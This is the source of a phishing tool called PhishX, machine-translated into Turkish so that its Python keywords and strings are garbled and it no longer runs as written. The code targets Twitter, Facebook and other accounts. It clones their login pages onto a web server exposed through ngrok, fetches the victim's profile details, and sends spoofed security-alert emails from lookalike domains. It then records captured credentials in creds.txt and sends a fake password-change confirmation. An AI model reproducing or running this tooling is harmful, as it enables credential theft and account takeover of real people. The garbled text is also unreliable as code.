#! / Usr / bin / python
# - * - kodlama: utf-8 - * -



# _ \ __ o__ __o / ooo o__ __o oo / o__ __o __ / _ o__ __o
# v | / <|> <|> <|> / vv \ <|> / v <| v <| v \
# / <> <> / \ /> <\ /> /> <> / \ <\
# o / | | o / \ oo / \ o__ __o / | \ o / o /
# / v o __ / _ _ \ __ o <| __ __ |> <| | __ __ | o __ / _ | __ _ <|
# /> | | / \ \\ | \ | | \
# o / <o> <o> o / \ o \ / <o> \ o <o> <o> \ o
# / v | | / vv \ oo | v \ | | v \
# /> _ \ o __ / _ / \ / \ /> <\ <\ __ __ /> / \ <\ / \ _ \ o __ / _ / \ <\
#
# {Beni Burada Takip Edin}
#
# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [Yazar: Z Hacker] ~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ `
# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [https://twitter.com/_DEF9] ~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ `
# `~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ [https://www.youtube.com/c/ZhackerL] ~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ `



ithalat  os

###############################################
# PhishX Kök Ayrıcalıklara İhtiyacı Var #
###############################################

eğer  os . geteuid () ! =  0 :
	exit ( "PhishX'i çalıştırmak için kök ayrıcalıklarına sahip olmanız gerekir" )

###############################################

 kodekleri içe aktar
ithalat  zamanı
 alt işlemi içe aktar
ithalat  istekleri
içe aktarma  zamanı
ithalat  sys
 rastgele içe aktar
dan  pyvirtualdisplay  ithalat  Display
dan  selenyum  ithalat  webdriver
dan  selenyum . webdriver . firefox . seçenekler  içe aktarma  Seçenekler
dan  selenyum . webdriver . firefox . firefox_binary  içe aktarma  FirefoxBinary

##########################################

gelen  veriler . ana  ithalat  *
gelen  veriler . twitter  içe aktarma  *
gelen  veriler . facebook  içe aktarma  *
gelen  veriler . instagram  içe aktarma  *
gelen  veriler . google  içe aktarma  *
gelen  veriler . buhar  ithalatı  *
gelen  veriler . github  içe aktarma  *
gelen  veriler . bağlantılı  ithalat  *
gelen  veriler . pinterest  ithalat  *
gelen  veriler . quora  import  *

gelen  veriler . smtp  içe aktarma  *

##########################################

Yeşil = " \ 033 [1; 33m"
Mavi = " \ 033 [1; 34m"
Gri = " \ 033 [1; 30m"
Sıfırla = " \ 033 [0m"
Kırmızı = " \ 033 [1; 31m"

##########################################

BAĞLANTI NOKTASI  =  '80'

Telefon  =  ''

Email_OS  =  ''
Email_time  =  ''
Email_from  =  ''
Email_ip  =  ''

##########################################

binary  =  FirefoxBinary ( 'base / firefox / firefox' )

##########################################

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################


# NOT: DRUNCC OLDUĞUMDA MENÜ VE BANNER FONKSİYONUNU KAYDIRIN ...
# Öyleyse, HER ZAMAN OLARAK Yuvarlanmaya Karar Verdim ..


def  Menüsü ():

	menu_items  = ([[ Twitter ' , ' Facebook ' , ' Instagram ' , ' Google ' , ' Steam ' , ' Github ' , ' LinkedIn ' , ' Pinterest ' , ' Quora ' ])
	menu_id  =  1	
	
	

	yazdırmak ( "" + Mavi + "@@@@@@@ @@@ @@@ @@@ @@@@@@ @@@ @@@ @@@ @@@" )
	yazdır ( "" + Mavi + "@@@@@@@@ @@@ @@@ @@@ @@@@@@@ @@@ @@@ @@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ için için için   )
	yazdır ( "" + Mavi + "@@! @@@ @@! @@@ @@!! @@ @@! @@@ @@!! @@"   )
	yazdır ( "" + Mavi + "! @! @! @! @! @! @! @!! @!! @! @! @! @! @ !!"   )
	yazdır ( "" + Mavi + "@! @@! @! @! @! @! @! @! !! @ !! @@ !! @! @! @! @!! @@! @!"   )
	yazdır ( "" + Mavi + "!! @ !!! !!! @ !!!! !!! !! @ !!! !!! @ !!!! @ !!!"   )
	yazdır ( "" + Mavi + "!!: !!: !!! !!:!:! !!: !!!!:: !!"   )
	yazdır ( "" + Mavi + ":!::!:!:!:!:!:!:!:!:!:!:!:!:!"   )
	yazdır ( "" + Mavi + ":: :: ::: :: :::: :: :: ::: :: :::"   )
	yazdırmak ( "" + Mavi + "::::: :::::::: ::" + Yeşil + "V1.1" )
	baskı ( "" + Mavi + "__________________________" + Gri + "[" + Sıfırla + "Z-HACKER" + Gri + "]" + Mavi + "____________________________" )
	print ( "" + Mavi + "________________________" + Gri + "[" + Kırmızı + "Zehirini Seç" + Gri + "]" + Mavi + "__________________________" + Sıfırla + " \ n " )	
	

	 menu_items içindeki platform  için : 
		yazdır ( "" + Gri + "[" + Mavi + str ( menu_id ) + Gri + "] - [" + Yeşil + platform + Gri + "]" )
		menu_id  =  menu_id  +  1	

	yazdır ( "" )
	yazdır ( "" + "[" + Mavi + "0" + Gri + "] - [" + Kırmızı + "Ekle" + Gri + "/" + Kırmızı + "SMTP'yi Kontrol Et" + Gri + "] -" + Gri + "- [" + Mavi + "99" + Gri + "] - [" + Kırmızı + "Çıkış" + Gri + "]"+ " \ n " )	

	menu_options = giriş ( "" + Gri + "$:" + Sıfırla )
	eğer  menu_options  ==  "0" :
		ADDSMTP ()	

	elif  menu_options  ==  "99" :
		ENDst ()	

	başka :
		dene :
			menu_options  =  int ( menü_seçenekleri ) -  1
			ltd  =  menu_items [ menu_options ]
			Menü . module  =  str ( ltd . alt ())
			Şerit ()
		 İstisna hariç :
			Menü ()





################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################



def  Şerit ():

	os . sistemi ( "sıfırla" )
	yazdırmak ( "" + Mavi + "@@@@@@@ @@@ @@@ @@@ @@@@@@ @@@ @@@ @@@ @@@"   )
	yazdır ( "" + Mavi + "@@@@@@@@ @@@ @@@ @@@ @@@@@@@ @@@ @@@ @@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ için için için   )
	yazdır ( "" + Mavi + "@@! @@@ @@! @@@ @@!! @@ @@! @@@ @@!! @@"   )
	yazdır ( "" + Mavi + "! @! @! @! @! @! @! @!! @!! @! @! @! @! @ !!"   )
	yazdır ( "" + Mavi + "@! @@! @! @! @! @! @! @! !! @ !! @@ !! @! @! @! @!! @@! @!"   )
	yazdır ( "" + Mavi + "!! @ !!! !!! @ !!!! !!! !! @ !!! !!! @ !!!! @ !!!"   )
	yazdır ( "" + Mavi + "!!: !!: !!! !!:!:! !!: !!!!:: !!"   )
	yazdır ( "" + Mavi + ":!::!:!:!:!:!:!:!:!:!:!:!:!:!"   )
	yazdır ( "" + Mavi + ":: :: ::: :: :::: :: :: ::: :: :::"   )
	yazdırmak ( "" + Mavi + "::::: :::::::: ::" + Yeşil + "V1.1" )
	baskı ( "" + Mavi + "__________________________" + Gri + "[" + Sıfırla + "Z-HACKER" + Gri + "]" + Mavi + "____________________________" )
	yazdır ( "" + Mavi + "___________________________" + Gri + "[" + Mavi + Menü . modül + Gri + "]" + Mavi + "_____________________________" + Sıfırla + " \ n \ n " )

	eğer  Menü . module  ==  "ADDSMTP" :
		ADDSMTP ()

	elif  menüsü . module  ==  "twitter" :
		Twitter ()

	elif  menüsü . module  ==  "facebook" :
		Facebook ()

	elif  menüsü . module  ==  "instagram" :
		Instagram ()

	elif  menüsü . module  ==  "google" :
		Google ()

	elif  menüsü . modül  ==  "buhar" :
		Steam ()

	elif  menüsü . module  ==  "github" :
		Github ()

	elif  menüsü . module  ==  "Linkedin" :
		LinkedIn ()

	elif  menüsü . module  ==  "pinterest" :
		Pinterest ()

	elif  menüsü . module  ==  "quora" :
		Quora ()
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################


# SMTP SUNUCU EKLEME İÇİN

def  ADDSMTP ():

	os . sistemi ( 'temiz' )

	lawl  =  input ( Yeşil + "" + Gri + "[" + Mavi + "A" + Gri + "]" + Mavi + "DD"  +  Yeşil  +  "veya" + Gri + "[" + Mavi + "C" + Gri + "]" + Mavi + "HECK, SMTP" + Gri + "? -" + Sıfırla )

	eğer  lawl  ==  "A" :
		os . sistemi ( 'temiz' )
		SMTP_server  =  giriş ( Gri + "[" + Mavi + "SUNUCU" + Gri + "]" + Yeşil + ":" + Sıfırla )
		PORT  =  giriş ( Gri + "[" + Mavi + "PORT" + Gri + "]" + Yeşil + ":" + Sıfırla )
		KULLANICI  =  giriş ( Gri + "[" + Mavi + "KULLANICI" + Gri + "]" + Yeşil + ":" + Sıfırla )
		PASS  =  giriş ( Gri + "[" + Mavi + "PASS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		filedata  =  str ( Smtp_Template )

		filedata  =  dosya verileri . değiştir ( '[SMTP]' , str ( SMTP_server ))
		filedata  =  dosya verileri . değiştir ( '[PORT]' , str ( PORT ))
		filedata  =  dosya verileri . değiştir ( '[USR]' , str ( USER ))
		filedata  =  dosya verileri . değiştirin ( '[PWD]' , str ( PASS ))

		ile  açık ( './data/smtp.py' , 'w' ) olarak  dosya :
			dosyası . yazma ( dosya verileri )
		
		giriş ( Yeşil + "[YAPILDI]" + Sıfırla + "Herhangi Bir Tuşa Basın-" )
		Menü ()

	elif  lawl  ==  "C" :
		os . sistemi ( 'reset' )
		E-posta  =  giriş ( Gri + "[" + Mavi + "E-postanız" + Gri + "]" + Yeşil + ":" + Sıfırla )
		SPEmail  =  giriş ( Gri + "[" + Mavi + "Sahte-E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )

		alt süreç . call ([ 'sendemail' , '-f' , str ( SPEmail ), '-t' , str ( E-posta ), '-u' , 'TEST' , '-m' , 'ÇALIŞIYOR!' , '-s ' , smtps + ":" + bağlantı noktası , ' -xu ' , kullanıcı adı , ' -xp ' , şifre ])
		giriş ( Yeşil + "[Tamamlandı]" + Sıfırla + "Herhangi Bir Tuşa Basın-" )
		Menü ()


	başka :
		giriş ( Kırmızı + "[YANLIŞ GİRİŞ]" + Sıfırla + "Herhangi Bir Tuşa Basın" )
		ADDSMTP ()



################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################


def  Twitter ():

	UNAME  =  giriş ( "" + Gri + "[" + Mavi + "Kullanıcı adı" + Gri + "]" + Yeşil + ":" + Kırmızı + "@" + Sıfırla )


	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )
	Email_try  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak ister misiniz ? Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Eğer  Email_try  ==  N '' :
		Email_OS  =  giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_from  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )

	elif  Email_try  ==  'y' :
		Email_OS  =  str ( rastgele . Seçim ([ 'Linux'ta Chrome' , 'Linux'ta Firefox' , 'Android'de Chrome' , 'Android'de Opera' , 'IOS'ta Chrome' , 'Windows'ta Firefox' ]))
		Email_from  =  str ( rastgele . Seçim ([ 'Irak' , 'Rusya' , 'İsveç' , 'Fransa' ]))


	# PRINTS SHIT
	os . sistemi ( 'reset' )
	baskı ( Mavi + "_________ ________" )
	yazdır ( Mavi + "| \\ ___ ___ \\ \\    __   \\                         " )
	yazdır ( Mavi + "                     \\ | ___ \\   \\ _ \\  \\   \\ | \\   \\                        " )
	yazdır ( Mavi + "                          \\  \\   \\  \\  \\    _ _ \\                       " )
	yazdır ( Mavi + "                           \\  \\   \\  \\  \\   \\ \\   \\ |" )
	yazdır ( Mavi + "                            \\  \\ __ \\  \\  \\ __ \\ \\ _ \\                      " )
	yazdır ( Mavi + "                             \\ | __ |   \\ | __ | \\ | __ |" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "" )
	baskı ( Mavi + "___ ___ ________ ________ ___ __" )
	yazdır ( Mavi + "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\      " )
	yazdır ( Mavi + "                 \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | |" )
	baskı ( Mavi + "                  \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\   " )
	baskı ( Mavi + "                   \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\ " )
	yazdır ( Mavi + "                    \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\ " )
	yazdır ( Mavi + "                     \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ | \ n " )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )


	# WEBSERVER DIRIMIZI TEMİZLİYOR
	os . sistemi ( 'rm -r ./WEBSERVER/' )
	os . sistemi ( 'mkdir ./WEBSERVER' )
	os . sistemi ( 'touch ./WEBSERVER/creds.txt' )
	# KULLANICILAR PFP ALIR
	profile_url  =  "https://twitter.com/" + UNAME
	profile_img_url  =  "https://twitter.com/" + UNAME + "/ profile_image? size = orijinal"

	alt süreç . çağrı ([ 'xterm' , '-e' , 'wget' , '-O' , './WEBSERVER/VICTIM.jpg' , profile_img_url ])


	# GÖRÜNMEZ BİR EKRAN YAPAR ... VE GECKO SÜRÜCÜSÜ SELENYUMU ÇALIŞIR

	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()

	br  =  web sürücüsü . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	zaman . uyku ( 2 )
	br . get ( profile_url )
	zaman . uyku ( 3 )
	NAME  =  str ( br . Find_element_by_css_selector ( ".ProfileHeaderCard-nameLink" ). Metin )

	br . kapat ()
	görüntüler . durdur ()

	# `~~~~~~~~~~~~~~~~~~~~~~~ [[BÜYÜK MUTLULUKLAR NEREDE] ~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~ #


	filedata  =  str ( INDEX_TWITTER )
	filedata  =  dosya verileri . değiştirin ( 'DEF-9' , str ( NAME ))
	filedata  =  dosya verileri . değiştir ( '_DEF9' , str ( UNAME ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )



	filedata  =  str ( MOBILE_TWITTER )
	filedata  =  dosya verileri . değiştirin ( 'DEF-9' , str ( NAME ))
	filedata  =  dosya verileri . değiştir ( '_DEF9' , str ( UNAME ))

	ile  açık ( './WEBSERVER/mobile.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )

	ile  açık ( './WEBSERVER/login.php' , 'w' ) olarak  dosya :
		dosyası . yazma ( str ( LOGIN_TWITTER ))

	ile  açık ( './WEBSERVER/account_secured.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( str ( SECURED_TWITTER ))



	# `~~~~~~~~~~~~~~~~~~~~~~~ [SİHİRLİ NEREDE] ~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~ #



	os . sistemi ( 'chmod -R 777 ./WEBSERVER/' )


	# `------------ [BİR WEBSERVER + NGROK İLE PORTU BAŞLIYOR] -------------` #

	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )


	# `AŞAĞIDAKİ YAYIN ...

	zaman . uyku ( 3 )
	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()
	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )
	zaman . uyku ( 5 )
	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	phishin_url  =  str ( url_f )


	# `EMAIL ŞABLONU ÜRETİYOR

	emaildata  =  str ( EMAIL1_TWITTER )
	emaildata  =  emaildata . değiştir ( '_DEF9' , str ( UNAME ))
	emaildata  =  emaildata . değiştir ( ' PHISHING_URL ' , str ( phishin_url ))
	emaildata  =  emaildata . değiştir ( 'Linux'ta Chrome' , str ( Email_OS ))
	emaildata  =  emaildata . yerine koy ( 'Irak' , str ( Email_from ))


	# `SPOOFED E-POSTA ADRESİNE KARAR VERİYOR

	from_email  =  str ( rastgele . seçim ([ 'security@twittermails.com' , 'no-reply@twittermails.com' ]))



	##################################
	# BUHARLI KÖTÜ E-POSTA #
	##################################


	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Twitter'a yeni giriş' , '-m' , e-posta verileri , '-s' , smtps + ":" + bağlantı noktası , '-xu' , kullanıcı adı , '-xp' , şifre ])
	os . sistemi ( 'reset' )



	##################################
	# KREDİ KONTROLÜ #
	##################################


	banN ()
	yazdır ( "              \ 033 [0; 37m ########################################## ####### " )
	print ( "#   \ 033 [0m UNAME'de Krediler için Dinleme: \ 033 [0; 94m" + str ( '@' + UNAME ) + " \ 033 [0; 37m #" )
	yazdır ( "################################################ # \ 033 [0; 93m " )
	yazdır ( "" + Gri + "[ \ 033 [0; 34m *" + Gri + "] - [" + Sıfırla + "EKSTRA-URL" + Gri + "]" + Sıfırla + ": \ 033 [0; 34m " + phishin_url + " \ 033 [0; 93m \ n " )

	os . sistemi ( "kuyruk -f ./WEBSERVER/creds.txt" )

	# `TEMİZLİYOR - SEBEP OLDU
	yazdır ( " \ n                  \ 033 [0; 34m ######################################" )
	yazdır ( "# --DONE-- #" )
	yazdır ( "######################################" )
	os . sistemi ( "pkill -9 ngrok" )
	os . sistemi ( "pkill -9 php" )

	yazdır ( "son bir adım !! \ n " )

	# `BİR ONAY E-POSTASI -
	Email_OS = giriş ( Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
	Email_from = giriş ( Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
	emaildata  =  str ( EMAIL2_TWITTER )
	emaildata  =  emaildata . değiştir ( '_DEF9' , str ( UNAME ))
	emaildata  =  emaildata . değiştir ( 'Linux'ta Chrome' , str ( Email_OS ))
	emaildata  =  emaildata . yerine koy ( 'Irak' , str ( Email_from ))
	alt süreç . call ([ 'sendemail' , '-f' , from_email , '-t' , str ( E-posta ), '-u' , 'Parola Değiştirildi' , '-m' , e-posta verileri , '-s' , smtps + ": " + port , '-xu' , kullanıcı adı , '-xp' , şifre ])

	os . sistemi ( 'reset' )
	ENDst ()

################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################
################################################## ################################################## #########################




def  Facebook ():

	ID  =  giriş ( "" + Gri + "[" + Mavi + "ID" + Gri + "]" + Yeşil + ":" + Sıfırla )
	full_name  =  girdi ( "" + Gri + "[" + Mavi + "Adı" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Phone_try  =  giriş ( "" + Gri + "[" + Mavi + "Hedefleri var Telefon numarası" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + Gri + " / " + Mavi + " N " + Gri + "] " + Yeşil + ": " + Sıfırla )

	eğer  Phone_try  ==  "N" :
		Telefon  =  " Telefon Yok"
	elif  Phone_try  ==  "y" :
		Telefon  =  giriş ( "" + Gri + "[" + Mavi + "Telefon" + Gri + "]" + Yeşil + ":" + Sıfırla )


	E-posta  =  giriş ( "" + Gri + "[" + Mavi + "E-posta" + Gri + "]" + Yeşil + ":" + Sıfırla )
	Email_try  =  giriş ( "" + Gri + "[" + Mavi + "" + Gri + "]" + Yeşil + "? -" + Gri + "[" + Mavi + "y" + için rastgele ayarlar kullanmak ister misiniz ? Gri + "/" + Mavi + "N" + Gri + "]" + Yeşil + ":" + Sıfırla )

	Eğer  Email_try  ==  N '' :
		Email_OS  =  giriş ( "" + Gri + "[" + Mavi + "OS" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_time  =  giriş ( "" + Gri + "[" + Mavi + "Zaman" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_from  =  giriş ( "" + Gri + "[" + Mavi + "Konum" + Gri + "]" + Yeşil + ":" + Sıfırla )
		Email_ip  =  giriş ( "" + Gri + "[" + Mavi + "IP" + Gri + "]" + Yeşil + ":" + Sıfırla )

	elif  Email_try  ==  'y' :
		Email_OS  =  rastgele . seçim ([ 'Windows 8' , 'Windows 7' , 'Windows 10' , 'Bilinmeyen' , 'Linux' , 'Android 6.0' , 'Android 5.0' , 'Android 4.0' , 'ios 10.1' , 'Mac OSX' ])
		Email_time  =  str ( rastgele . Seçim ([ '3:14' , '4:36' , '9:04' , '21: 43 ' , '14: 32' , '1:13' , '2:23' , '16: 56 ' , '10: 34' ])) +  "GMT"
		Email_from  =  "Kuzey Palm Beach, ABD"
		Email_ip  =  rastgele . seçim ([
			"104.131.141.114" ,
			"104.131.206.23" ,
			"104.131.245.55" ,
			"104.131.4.237" ,
			"104.131.65.225" ,
			"104.156.224.83" ,
			"104.163.133.75" ,
			"104.167.123.52" ,
			"104.168.53.37" ,
			"104.168.57.75" ,
			"104.169.47.152" ,
			"104.191.31.69" ,
			"104.192.102.156" ,
			"104.194.157.151" ,
			"104.199.115.227" ,
			"104.206.237.23" ,
			"104.209.44.248" ,
			"104.215.23.88" ,
			"104.218.63.72" ,
			"104.218.63.73" ])



	first_name  =  TAM_ISIM . şerit (). bölünmüş ( "" , 1 ) [ 0 ]


	phone_w = açık ( 'sms_support / phone' , 'w' )
	phone_w . yazma ( str ( Telefon + ":" + ad_adı ))
	phone_w . kapat ()


	os . sistemi ( "sıfırla" )
	yazdır ( Mavi + " \ n          ________ ________ ________ _______" )
	yazdır ( Mavi + "| \\   _____ \\ \\    __   \\ | \\    ____ \\ | \\   ___ \\               " )
	yazdır ( Mavi + "         \\  \\   \\ __ / \\  \\   \\ | \\   \\  \\   \\ ___ | \\  \\    __ / |" )
	yazdır ( Mavi + "          \\  \\    __ \\ \\  \\    __   \\  \\   \\     \\  \\   \\ _ | / __" )
	yazdır ( Mavi + "           \\  \\   \\ _ | \\  \\   \\  \\   \\  \\   \\ ____ \\  \\   \\ _ | \\  \\ ------ +" )
	yazdır ( Mavi + "            \\  \\ __ \\    \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\        \\   " )
	yazdır ( Mavi + "             \\ | __ |     \\ | __ | \\ | __ | \\ | _______ | \\ | _______ |         \\ " )
	yazdır ( Mavi + "                                                             \\ " )
	baskı ( Mavi + "                                                              \\ ---- \\ Z \\ " )
	yazdır ( Mavi + "                                                               \\ " )
	baskı ( Mavi + "___ ___ ________ ________ ___ __           \\ " )
	yazdır ( Mavi + "| \\   \\ | \\   \\ | \\    __   \\ | \\    __   \\ | \\   \\ | \\   \\          \\    " )
	yazdır ( Mavi + "                \\  \\   \\ \\ \\   \\  \\   \\ | \\   \\  \\   \\ | \\   \\  \\   \\ / / | | _         \\ " )
	yazdır ( Mavi + "                 \\  \\    __   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\    ___   \\ -------- +" )
	baskı ( Mavi + "                  \\  \\   \\  \\   \\  \\   \\ \\ \\   \\  \\   \\ \\ \\   \\  \\   \\ \\  \\   \\ " )
	yazdır ( Mavi + "                   \\  \\ __ \\  \\ __ \\  \\ _______ \\  \\ _______ \\  \\ __ \\ \\  \\ __ \\ " )
	yazdır ( Mavi + "                    \\ | __ | \\ | __ | \\ | _______ | \\ | _______ | \\ | __ | \\ | __ |" + Yeşil + "V1.2 \ n " )
	yazdır ( "" + Gri + "[" + Yeşil + "Saldırı Başladı" + Gri + "]" + Sıfırla )

	pic  =  str ( "https://graph.facebook.com/" + str ( ID ) + "/ picture" )




	os . sistemi ( "rm -r WEBSERVER /" )
	os . sistemi ( "mkdir WEBSERVER" )



	filedata  =  str ( Ana_Facebook )

	filedata  =  dosya verileri . değiştirin ( '[PIC]' , str ( resim ))
	filedata  =  dosya verileri . değiştir ( '[FIRSTNAME]' , str ( ad_adı ))

	ile  açık ( './WEBSERVER/index.html' , 'w' ) olarak  dosya :
		dosyası . yazma ( dosya verileri )

	filedata  =  str ( Mobile_Facebook )
	mobile  =  açık ( './WEBSERVER/i_mobile.html' , 'w' )
	mobil . yazma ( dosya verileri )
	mobil . kapat ()

	filedata  =  str ( Giriş_Facebook )
	login  =  open ( './WEBSERVER/login.php' , 'w' )
	giriş yapın . yazma ( dosya verileri )
	giriş yapın . kapat ()

	filedata  =  str ( Güvenli_Facebook )
	güvenli  =  açık ( './WEBSERVER/account_secured.html' , 'w' )
	güvenli . yazma ( dosya verileri )
	güvenli . kapat ()

	os . sistemi ( "dokunmatik ./WEBSERVER/creds.txt" )
	os . sistemi ( "chmod -R 777 WEBSERVER /" )






	os . sistemi ( 'xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &' )
	os . sistemi ( "./ngrok http 80> / dev / null &" )

	zaman . uyku ( 3 )

	display  =  Display ( görünür = 0 , boyut = ( 800 , 600 ))
	görüntüler . başlangıç ()


	tarayıcı  =  webdriver . Firefox ( firefox_binary = ikili , çalıştırılabilir_yol = 'temel / geckodriver' )
	tarayıcı . get ( "http: // localhost: 4040 / status" )

	zaman . uyku ( 5 )

	url_f = str ( tarayıcı . find_element_by_css_selector ( "li.list-unstyled: nth-child (1)> div: nth-child (2)> tablo: nth-child (2)> tbody: nth-child (1)> tr : nth-child (1)> td: nth-child (2) " ). metin )
	tarayıcı . kapat ()
	phishin_url  =  str ( url_f )



	###################################
	# KÖPÜKLÜ E-POSTA GÖNDERME #
	###################################


	email_body_html = ( "" "<! DOCTYPE HTML KAMU" - // W3C // DTD XHTML 1.0 Geçiş // TR "" http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd "> <html xmlns = "http://www.w3.org/1999/xhtml" xmlns: v = "urn: schemas-microsoft-com: vml" xmlns: o = "urn: şemalar-microsoft-com: ofis: ofis "> <head> \ n     <! - [eğer gte mso 9]> <xml> \ n      <o: OfficeDocumentSettings> \ n       <o: AllowPNG /> \ n       <o: PixelsPerInch> 96 </ o: PixelsPerInch> \ n      </ o: OfficeDocumentSettings> \ n     </xml> <! [endif] -> \ n     <meta http-equiv = "İçerik Türü"content = "text / html; charset = utf-8"> \ n     <meta adı = "görünüm alanı" content = "width = device-width">\ n     <! - [eğer! mso]> <! -> <meta http-equiv = "X-UA-Uyumlu" içerik = "IE = kenar"> <! - <! [endif] -> \ n     <title> </title> \ n     \ n     \ n     <stil türü = "metin / css" id = "medya sorgusu"> \ n       gövde { \ n   kenar boşluğu: 0; \ n   dolgu: 0; } \ n \ n tablo, tr, td { \ n   dikey hizalama: üst; \ n   sınır-çöküşü: çöküş; } \ n \ n. tarayıcı tarayıcı tablosu, .mso-konteyner tablosu { \ n   tablo düzeni: sabit; } \ n \ n * { \ n   satır yüksekliği: devral;a [x-apple-data-detectors = true] { \ n   renk: miras! önemli; \ n   metin dekorasyonu: yok! önemli; } \ n \ n [owa] .img-container div, [owa] .img-container düğmesi { \ n   display: block! important; } \ n \ n [owa] .ful   genişlik düğmesi { \ n genişlik:% 100! önemli; } \ n \ n [owa] .block-grid .col { \ n   görüntüleme: tablo hücresi; \ n   şamandıra: yok! önemli; \ n   dikey hizalama: üst; } \ n \ n .ie-tarayıcı .num12, .ie-tarayıcı .block-grid, [owa] .num12, [owa] .block-grid { \ n   genişlik: 480 piksel! önemli; } \ n\ n .ExternalClass, .ExternalClass p, .ExternalClass aralığı, .ExternalClass yazı tipi, .ExternalClass td, .ExternalClass div { \ n   satır yüksekliği: 100%; } \ n \ n .ie-tarayıcı. karışık-iki-yukarı .num4, [owa]. karışık-iki-yukarı .num4 { \ n   genişlik: 160 piksel ! önemli; } \ n \ n .ie-tarayıcı. karışık-iki-yukarı .num8, [owa]. karışık-iki-yukarı .num8 { \ n   genişlik: 320 piksel! önemli; } \ n \ n .ie-tarayıcı .block-grid.two-up .col, [owa] .block-grid.two-up .col { \ n   genişlik: 240px! önemli; } \ n \ n .ie-tarayıcı .block-grid.three-up .col, [owa] .block-grid.three-up .col { \ n   genişlik: 160px ! önemli; }\ n \ n .ie-tarayıcı .block-grid.four-up .col, [owa] .block-grid.four-up .col { \ n   genişlik: 120px! önemli; } \ n \ n .ie-tarayıcı .block-grid.five-up .col, [owa] .block-grid.five-up .col { \ n   genişlik: 96px! önemli; } \ n \ n .ie-tarayıcı .block-grid.six-up .col, [owa] .block-grid.six-up .col { \ n   genişlik: 80px! önemli; } \ n \ n .ie-tarayıcı .block-grid.seven-up .col, [owa] .block-grid.seven-up .col { \ n   genişlik: 68px! önemli; } \ n \ n .ie-tarayıcı .block-grid.eight-up .col, [owa] .block-grid.eight-up .col { \ n   genişlik: 60px! önemli; } \ n\ n .ie-tarayıcı .block-grid.nine-up .col, [owa] .block-grid.nine-up .col { \ n   genişlik: 53px! önemli; } \ n \ n .ie-tarayıcı .block-grid.ten-up .col, [owa] .block-grid.ten-up .col { \ n   genişlik: 48px! 